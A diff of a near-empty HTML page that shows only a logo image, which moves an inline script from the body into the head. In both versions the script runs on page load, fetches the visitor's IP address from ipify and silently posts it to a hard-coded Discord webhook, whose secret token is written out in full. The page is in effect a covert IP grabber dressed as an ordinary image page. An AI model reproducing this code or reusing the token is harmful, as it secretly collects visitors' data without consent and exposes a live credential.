@@ -5,30 +5,31 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title></title>
 </head>
+<script>
+    // URL de l'API ipify pour obtenir l'adresse IP
+    const apiURL = "https://api.ipify.org?format=json";
+
+    // Effectue une requête pour récupérer l'IP
+    fetch(apiURL)
+        .then(response => response.json())
+        .then(data => {
+            console.log("Adresse IP:", data.ip);
+
+            // Tu peux aussi envoyer cette IP à ton serveur ou l'afficher
+            // Exemple : envoi vers un webhook Discord
+            const webhookURL = "https://canary.discord.com/api/webhooks/1295825062724894772/vJ0PsoAUd8YZyYQUizVzqC2nMpqqQYPfa9sVllxbaAejWxKFmA03S89T3-KQII_EQsMp";
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: `Nouvelle IP détectée : ${data.ip}`
+                })
+            }).then(() => console.log("IP envoyée au webhook"));
+        })
+        .catch(error => console.error("Erreur lors de la récupération de l'IP:", error));
+</script>
 <body>
-    <img src="Free-Logos-PNG-File.png" alt="">
-    <script>
-        // URL de l'API ipify pour obtenir l'adresse IP
-        const apiURL = "https://api.ipify.org?format=json";
-
-        // Effectue une requête pour récupérer l'IP
-        fetch(apiURL)
-            .then(response => response.json())
-            .then(data => {
-                console.log("Adresse IP:", data.ip);
-
-                // Tu peux aussi envoyer cette IP à ton serveur ou l'afficher
-                // Exemple : envoi vers un webhook Discord
-                const webhookURL = "https://canary.discord.com/api/webhooks/1295825062724894772/vJ0PsoAUd8YZyYQUizVzqC2nMpqqQYPfa9sVllxbaAejWxKFmA03S89T3-KQII_EQsMp";
-                fetch(webhookURL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        content: `Nouvelle IP détectée : ${data.ip}`
-                    })
-                }).then(() => console.log("IP envoyée au webhook"));
-            })
-            .catch(error => console.error("Erreur lors de la récupération de l'IP:", error));
-    </script>
+    <img src="Free-Logos-PNG-File.png"  alt="">
+    
 </body>
 </html>
